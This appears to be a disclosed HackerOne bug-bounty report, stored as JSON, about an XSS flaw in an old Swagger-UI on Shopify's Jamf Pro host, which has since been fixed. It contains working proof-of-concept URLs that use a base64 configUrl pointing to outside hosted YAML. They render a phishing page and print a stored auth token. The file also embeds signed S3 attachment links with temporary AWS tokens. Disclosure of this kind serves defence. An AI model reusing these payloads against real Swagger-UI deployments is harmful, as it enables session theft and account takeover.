@@ -1,0 +1,201 @@
+{
+  "id": 1444682,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDQ0Njgy",
+  "url": "https://hackerone.com/reports/1444682",
+  "title": "XSS at jamfpro.shopifycloud.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2022-01-09T21:17:19.843Z",
+  "submitted_at": "2022-01-09T21:17:19.949Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "kannthu",
+    "url": "/kannthu",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/xfRp7ZaqXYiFaygWh3c7JaB9/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2023-02-02T20:45:36.248Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-05-12T18:42:03.492Z",
+  "team_member_agreed_on_going_public_at": "2023-02-02T20:45:36.121Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "*Description*\nThere is Jamf Pro running at https://jamfpro.shopifycloud.com/ which has old Swagger-UI exposed at /classicapi/doc/. I think it's possible to take over the Jamf Pro account of the user that clicks the link. (more about that below) \n\n*Steps to reproduce*\n\n**POC with simple alert box**:\n1. Open `https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`\n2. You should see an alert box (F1573391)\n\n**POC rendering phishing page**:\n1. Click the link: `https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjogImh0dHBzOi8vdGVhcmZ1bC1lYXJ0aC5zdXJnZS5zaC90ZXN0LnlhbWwiLAp9`\n2. You should see a phishing page rendered (F1573392)\n\n**POC of stealing auth token**:\nJamf Pro stores authentication token in localstorage under `authToken` key when you authenticate using login and password, so my assumption is that it will do the same for Saml authentication. (you will have to test that) If it's true then taking over the user's account who clicked the link would be trivial. The POC below will print `authToken` from localstorage.\n\n1. Authenticate to `jamfpro.shopifycloud.com` and click the link: `https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9zdGFuZGluZy1zYWx0LnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`\n2. You should see an alert box with auth token. \n\n## Impact\n\nAn attacker can execute arbitrary JS code in the context of https://jamfpro.shopifycloud.com/ - it means he can do whatever authenticated user at https://jamfpro.shopifycloud.com/ could do.\n\n## Impact\n\nAn attacker can execute arbitrary JS code in the context of https://jamfpro.shopifycloud.com/ - it means he can do whatever authenticated user at https://jamfpro.shopifycloud.com/ could do.",
+  "bounty_amount": "9400.0",
+  "formatted_bounty": "$9,400",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1573391,
+      "file_name": "Zrzut_ekranu_2022-01-9_o_22.08.24.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wtxyodxx8sa2y4vu3eb8vfz1jwtm?response-content-disposition=attachment%3B%20filename%3D%22Zrzut_ekranu_2022-01-9_o_22.08.24.png%22%3B%20filename%2A%3DUTF-8%27%27Zrzut_ekranu_2022-01-9_o_22.08.24.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ6PEPZPS%2F20260816%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260816T120018Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEGQaCXVzLXdlc3QtMiJGMEQCIC7lJduApLPiL2e3ESZVudNLSyjJWHBnvfr7tsUmX%2FNLAiBuUA1GMg1dcLMcQzGCbFI%2BaACmlB9aoNw31pmsxkJ70iqxBQgtEAMaDDAxMzYxOTI3NDg0OSIM6OmWADKfr101mDqwKo4FE8NxmOV%2FVQJqOqVhn3MxwkKOBrFG6nei8158dqxIf5ZtX59ZpDLj1JuEOPkPpVwNLVkQj2W3LypMTdrTEUEdUivBYl214ofnDP79UfK4DBJddDO8EPKdZaMELX5ohMdiMdHaqMO975tTnu4i1PZ%2F5W9qOa%2FBrblYmf6Rau1nZwSJoQ2QN1ZXOtXe6rxi%2BxgbAwNZyQ2L5ZHNSUsumtiKJpAtLDJO53zXcItdoeOWg%2BbrCigdKfYcP73OU2kwAS0ZR7Ijnis2fV7RGG6ZCfu5v6iBSKS30x2O%2Bn5N3b9m%2FM6CX89U0rmS7P37WE%2Byml%2FK4bPbfp2X3Ss0ToQJpT9U1tTLqikqFS8M3rePi1fhrKjfk62DAm8xdt0B1eCyPJsApa%2FLScH1KRiAJfTiqxEmEkp4qN5lb%2Fy3%2By8XkBxBrEAfcFABvAJmtSXHuR2x72g%2BD9Ufl7jutcvsfKNlsh5ACG9m12koGZItgOlc0L3Gt42IRWSuNSza4KmsHBcNFxn3uMYGTRM9M9Q0A4yEBFw4QPgdxh3WQjN55iFMCsVPdzboKSg8kyuD4mNRG6Ls3G6xy0YR5Knp%2F88GzW%2BYWG6Hraz8g7iTXPx9ZPiBw1ne6PqaswQvV061nRCr%2FebtvWJDd29L6lWMmsEQKAfJcufduc7Z%2FmyJ800R75zS%2FfEFOJAncm71EAHsSf%2BTex3UdLvnM6KyTjLU7HonCBPgLP%2BCteuAAYj7DG5sgodgaNW9Ja3DMGls2PiGG40JF8%2F5APn2kstcZucWlyvUylMUPl4V%2FWCMHHDXIs54WQVaGbdAMteKgxugdvNuapWS8qKMNFubl2rUaSzzNjlAHmASo86DimxndRrccKDmIyPqbn0XMLS%2FhtQGOrIBn9hqPvF8afgTNmMHy6AP3KX%2F1mHBsbme50swSTXd6%2BMzg3vOdQ4oB8TTuIFRmUJMQeTEpVZWzC4q7Hm1rhhO1q7bZU5YymFH4EpTzs7WnPHcgBEtU2bc%2B2RPhl1musAwlQ%2BH%2Fv5jdt%2FnoJe2Dlm7m57wKdAZQaCKJMl3pxGJmmCEoTb8WqYfxS%2Bk0ziGi2tYWVKDc%2BWeM15e2p3rkFJqA%2FR%2F5HNt%2B3sges%2Be3j0BNKmDeg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b88dea2f1e052c266ad9b556201e64133639b08f4866526eab8c73d177a7e0b5",
+      "file_size": 95794,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1573392,
+      "file_name": "Zrzut_ekranu_2022-01-9_o_22.08.49.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7ms10fdz2i2kt7f870ktksovhg61?response-content-disposition=attachment%3B%20filename%3D%22Zrzut_ekranu_2022-01-9_o_22.08.49.png%22%3B%20filename%2A%3DUTF-8%27%27Zrzut_ekranu_2022-01-9_o_22.08.49.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ6PEPZPS%2F20260816%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260816T120018Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEGQaCXVzLXdlc3QtMiJGMEQCIC7lJduApLPiL2e3ESZVudNLSyjJWHBnvfr7tsUmX%2FNLAiBuUA1GMg1dcLMcQzGCbFI%2BaACmlB9aoNw31pmsxkJ70iqxBQgtEAMaDDAxMzYxOTI3NDg0OSIM6OmWADKfr101mDqwKo4FE8NxmOV%2FVQJqOqVhn3MxwkKOBrFG6nei8158dqxIf5ZtX59ZpDLj1JuEOPkPpVwNLVkQj2W3LypMTdrTEUEdUivBYl214ofnDP79UfK4DBJddDO8EPKdZaMELX5ohMdiMdHaqMO975tTnu4i1PZ%2F5W9qOa%2FBrblYmf6Rau1nZwSJoQ2QN1ZXOtXe6rxi%2BxgbAwNZyQ2L5ZHNSUsumtiKJpAtLDJO53zXcItdoeOWg%2BbrCigdKfYcP73OU2kwAS0ZR7Ijnis2fV7RGG6ZCfu5v6iBSKS30x2O%2Bn5N3b9m%2FM6CX89U0rmS7P37WE%2Byml%2FK4bPbfp2X3Ss0ToQJpT9U1tTLqikqFS8M3rePi1fhrKjfk62DAm8xdt0B1eCyPJsApa%2FLScH1KRiAJfTiqxEmEkp4qN5lb%2Fy3%2By8XkBxBrEAfcFABvAJmtSXHuR2x72g%2BD9Ufl7jutcvsfKNlsh5ACG9m12koGZItgOlc0L3Gt42IRWSuNSza4KmsHBcNFxn3uMYGTRM9M9Q0A4yEBFw4QPgdxh3WQjN55iFMCsVPdzboKSg8kyuD4mNRG6Ls3G6xy0YR5Knp%2F88GzW%2BYWG6Hraz8g7iTXPx9ZPiBw1ne6PqaswQvV061nRCr%2FebtvWJDd29L6lWMmsEQKAfJcufduc7Z%2FmyJ800R75zS%2FfEFOJAncm71EAHsSf%2BTex3UdLvnM6KyTjLU7HonCBPgLP%2BCteuAAYj7DG5sgodgaNW9Ja3DMGls2PiGG40JF8%2F5APn2kstcZucWlyvUylMUPl4V%2FWCMHHDXIs54WQVaGbdAMteKgxugdvNuapWS8qKMNFubl2rUaSzzNjlAHmASo86DimxndRrccKDmIyPqbn0XMLS%2FhtQGOrIBn9hqPvF8afgTNmMHy6AP3KX%2F1mHBsbme50swSTXd6%2BMzg3vOdQ4oB8TTuIFRmUJMQeTEpVZWzC4q7Hm1rhhO1q7bZU5YymFH4EpTzs7WnPHcgBEtU2bc%2B2RPhl1musAwlQ%2BH%2Fv5jdt%2FnoJe2Dlm7m57wKdAZQaCKJMl3pxGJmmCEoTb8WqYfxS%2Bk0ziGi2tYWVKDc%2BWeM15e2p3rkFJqA%2FR%2F5HNt%2B3sges%2Be3j0BNKmDeg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6ec84fe7e8541b26030c94c671139c7534058abbfd9222e10ddcc73db8454c8c",
+      "file_size": 65919,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 239,
+  "voters": [
+    "proviesec",
+    "mizzle",
+    "alganad",
+    "mamrezzsr",
+    "mr-medi",
+    "cogitovirusxxx",
+    "loaymorad",
+    "haqpl",
+    "orange303",
+    "uneefa",
+    "and 229 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.7,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 73212,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.shopifycloud.com",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 244914,
+      "category": "team",
+      "content": "On January 9th, 2022, @kannthu discovered that the instance of Jamf Pro running on `https://jamfpro.shopifycloud.com` has the old Swagger-UI exposed at `/classicapi/doc/`. It was possible for an attacker to craft a URL that could introduce an XSS payload to be ran in the application context. \nOur engineers deployed a fix that removed access to this endpoint, mitigating this vulnerability.",
+      "updated_at": "2023-01-27T21:06:09.370Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 1817096,
+        "username": "phil_shopify",
+        "name": "Phil",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2021-06-30T16:24:52.607Z",
+        "url": "https://hackerone.com/phil_shopify",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/akq0lw8enbpu74hhl1ecs4pqgbpi/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/akq0lw8enbpu74hhl1ecs4pqgbpi/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/akq0lw8enbpu74hhl1ecs4pqgbpi/5d27521e1b671a8e8bc4f016cace6a876120e5addf7dcc35ae4a5eac091669a9"
+        }
+      }
+    },
+    {
+      "id": 249802,
+      "category": "researcher",
+      "content": "The issue was found as part of a research project on https://www.vidocsecurity.com/blog/2022-summary-how-we-made-120k-bug-bounty-in-a-year/\n\nWe created a Module specifically to detect Swagger UI across different companies - this issue was discovered using this Module. You can use this module yourself and detect Swagger UIs at scale:)",
+      "updated_at": "2023-08-01T15:28:49.400Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 695357,
+        "username": "kannthu",
+        "name": "Dawid Moczad\u0142o",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://www.vidocsecurity.com",
+        "location": "Gda\u0144sk",
+        "created_at": "2019-08-01T22:10:41.114Z",
+        "url": "https://hackerone.com/kannthu",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/xfRp7ZaqXYiFaygWh3c7JaB9/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/xfRp7ZaqXYiFaygWh3c7JaB9/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/xfRp7ZaqXYiFaygWh3c7JaB9/5d27521e1b671a8e8bc4f016cace6a876120e5addf7dcc35ae4a5eac091669a9"
+        }
+      }
+    }
+  ]
+}
